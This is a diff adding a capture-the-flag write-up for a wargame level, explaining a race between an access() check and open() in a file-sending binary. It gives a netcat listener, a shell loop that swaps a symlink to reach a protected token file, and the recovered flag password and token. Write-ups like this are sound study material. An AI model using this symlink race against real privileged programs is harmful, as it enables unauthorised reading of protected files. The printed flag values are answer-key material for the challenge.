@@ -1,0 +1,34 @@
+There is a program that sends a file to address listening in port 6969. We can
+test this by creating a file with some text and opening another terminal with
+netcat in listening and continuous mode:
+
+```nc -lk 6969```
+
+After inspecting the binary there is a call to the access function to check for
+user rights, if it passes it will open it and send it. We have to exploit this,
+one option is to create a while loop and continuously change a symlink from a
+file which I have permission to the token file, that way the access function
+will work and when the open function is called the new symlink will be there.
+
+Let's make a basic shell script to do this:
+````
+touch /tmp/fake
+while true
+do
+	ln -sf /home/user/level10/token /tmp/tolkien
+	ln -sf /tmp/fake /tmp/tolkien
+done
+```
+
+Then after launching the program a few times we will open the file correctly:
+
+```./level10 /tmp/tolkien 127.0.0.1 ```
+
+-----------------------------------------------
+flag10 password:	woupa2yuojeeaaed06riuj63c
+token:				feulo4b72j7edeahuete3no7c
+-----------------------------------------------
+
+Links:
+https://stackoverflow.com/questions/7925177/access-security-hole
+https://samsclass.info/127/proj/E10.htm
